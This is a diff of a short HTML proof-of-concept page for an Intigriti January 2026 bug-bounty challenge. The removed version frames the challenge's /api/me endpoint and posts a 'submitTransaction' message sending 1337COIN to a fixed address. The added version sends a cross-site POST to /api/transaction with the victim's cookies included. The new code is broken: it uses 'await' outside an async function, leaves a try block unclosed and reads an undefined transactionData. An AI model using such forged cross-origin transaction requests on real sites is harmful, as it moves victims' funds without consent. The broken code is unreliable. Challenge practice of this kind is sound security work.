@@ -1,18 +1,22 @@
 <title>Intigriti Jan 2026 PoC</title>
 <h1>Intigriti Jan 2026 PoC</h1>
 <div></div>
-<iframe id="pmtframe" src="https://challenge-0126.intigriti.io/api/me" style="width:100%; height:80%;"></iframe>
+<div id='response'></div>
 <script>
-setTimeout(() => {
-console.log("Waited for 1 second");
-}, 1000);
-document.getElementById('pmtframe').contentWindow.proceedToPayment();
-document.getElementById('pmtframe').contentWindow.postMessage({
-        type: 'submitTransaction',
-        transaction: {
-        toAddress: "1efa71b644e7179d950eb04e38b038ddd2",
-        currency: "1337COIN",
-        amount: "1.00000000"
-        }
-}, '*');
+try {
+                    const response = await fetch('https://challenge-0126.intigriti.io/api/transaction', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        credentials: 'include',
+                        body: JSON.stringify({
+                            toAddress: transactionData.toAddress,
+                            currency: transactionData.currency,
+                            amount: transactionData.amount
+                        })
+                    });
+
+                    const result = await response.json();
+        document.getElementById('response').innerHTML = result;
 </script>
